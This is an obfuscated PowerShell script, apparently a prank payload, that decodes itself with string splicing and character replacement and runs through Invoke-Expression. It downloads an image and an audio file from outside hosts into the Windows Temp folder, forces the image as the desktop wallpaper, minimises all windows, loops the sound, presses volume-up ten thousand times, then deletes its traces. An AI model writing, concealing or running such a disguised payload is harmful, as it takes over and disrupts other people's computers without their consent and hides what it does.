 (('JMjimg'+'Path=hpAC:9TBWindows9TBTemp9TBb.jpghpA
J'+'MjaudioPath=hpAC:9TBWindows9TBTemp9TBa.wavhpA
Invoke-WebRequest -Uri https://i1.sndcdn.com/artwor'+'ks-000015364470-671i8t-t500x500.jpg -OutFile JMjimgPath
In'+'voke-WebRequest -Uri https://github.com/J'+'u'+'stincoding3/GoogleFormsSpammer/raw/main/Mario%20Oh%20No!.wav -OutFile JMjaudioPath

function Set-Wallpape'+'r {
  '+'  param (
        [string]JMjP'+'ath,
        [ValidateSet(PDrTilePDr, PDrCe'+'nterPDr, PDrStretchPDr, PDrFillPDr, PDrFi'+'tPDr, '+'PDrSpan'+'PDr)]
        [string]JMjStyle = PDrFillPDr
    )

    begin {
        t'+'ry {
            Add-Type @hpA
                using System;
                using System.Runtime.Interop'+'Services;
                using Microsoft.Win3'+'2;
                namespace Wallpaper
               '+' {
                    publi'+'c enum Style : int'+'
                    {
	                    Tile, Center, Stretch, Fill, Fit, Span, NoChange
                    '+'}

   '+'        '+'         public class Setter
                    {
	                    public const int SetDesktopWallpaper = 20;
	                    public const int UpdateIniFile = 0x01;'+'
	   '+'                 public '+'const int SendWinIniChange = 0x02;
	  '+'      '+'            [DllImport( hpAuser32.dllhpA'+','+' SetLastError '+'= true, CharSet = CharSet.Auto )]
	                    private static extern int SystemParameter'+'sInfo ( int uAction, int uParam, string lpvParam, int fuWinIni );
	                    public static void SetWallpaper ( string path, Wallpaper'+'.Style style )
                        {
		                    SystemParametersI'+'nfo( SetDesktopWallpaper, '+'0, path, UpdateIniFile 4qJ SendWinIniChange );
		                    RegistryKey'+' key = Registry.CurrentUser.OpenSubKey( hpAControl Pan'+'el9TB9TBDesktophpA, true );
		                    switch( style )
		                    {
			                    case Style.Tile :
			                    key.SetValue( @hp'+'AWallpaperStylehpA, hpA0hpA ) ;
			                    key.SetValue( @hpATileW'+'allpaperhpA, hpA1hpA ) ;
			 '+'                   break;
			                    case Style.Cente'+'r :
		'+'	                    key.SetValue( @hpAWallpaperStylehpA, hp'+'A0hpA ) ;
			                    key.SetValue( @'+'h'+'pATileWallpaperhpA, hpA0hpA ) ;
			 '+'                   break;
			                    case Style.Stretch :
	'+'		                  '+'  key.SetValue( @hpAWallpaperStylehpA, hpA2hpA ) ;
			    '+'                key.Se'+'tValue( @hpATileWallpaperhpA, hpA0hpA ) ;
'+'			'+'                    break;
			                    case Style.Fill :
			                    key.SetValue( @hpAWallpaperStylehpA, hpA10hpA ) ;
			                    key.SetValue( @hpATileWa'+'llpaperhpA,'+' hpA0hpA ) ;
			    '+'                '+'break;
			'+'                    cas'+'e Style.Fit :
			                    key.SetValue( @hpAWallpaperStylehpA, hpA6hpA ) ;
			                    key.SetValue( @hpATileWallpaperhpA, hpA0hpA ) ;
			                    break;
			                    case Style.Span '+':
			                    key.SetValue( @hpAWall'+'paperStylehpA,'+' hpA22hpA ) ;
			                    key.'+'SetValue( @hpATileWa'+'llpaperhpA, hpA0hpA ) ;
			                    break;
			                    case S'+'tyle.NoChange :
			                '+'    break;
		                    }
		                    key.Close();
'+'	                    }
                    }
  '+'   '+'           }
hpA@
        } cat'+'ch {}

        JMjStyleNum = @{
            Tile = 0
'+'            Center = 1
 '+'           Stretch = 2
            Fill = 3
            Fit = 4
            S'+'pan = 5
        }
    }

'+'
    process {
        [Wallpaper.Sette'+'r]::SetWallpaper(JMjPath, JMjStyl'+'eNum[JMjStyle])

        
        [Wallpaper.Setter]::SetWallpaper'+'(JMjPat'+'h, JMjStyleNum[JMjStyle])
    }
}

Se'+'t-WallPaper -Path PDrC:9TBWindows9TBTemp9TBb.jpgPDr -Style Tile
(New-Object -ComObject shell.applica'+'tion).toggleDesktop()
JMj'+'player = New-Obje'+'ct -TypeName Syste'+'m.Media.SoundPlayer
JMjplayer.SoundLocation = PDrC:9TBWindows9TBTemp9TBa.wavPDr
JMj'+'player.Load()
J'+'Mjplayer.PlayLooping()
1..10000 4qJ % {(ne'+'w-object -com wscript.shell).SendKeys([char]175)}
Remove-Item JMjimgPath -ErrorAction Ignore
Remove-Item JMjaudiopath -ErrorAction Ignore
St'+'art-Sleep -Seconds 3
exit

')-replaCe([cHaR]57+[cHaR]84+[cHaR]66),[cHaR]92 -replaCe 'PDr',[cHaR]39-cReplaCe  ([cHaR]104+[cHaR]112+[cHaR]65),[cHaR]34-cReplaCe 'JMj',[cHaR]36-replaCe  '4qJ',[cHaR]124)| InvoKe-ExPREssiOn
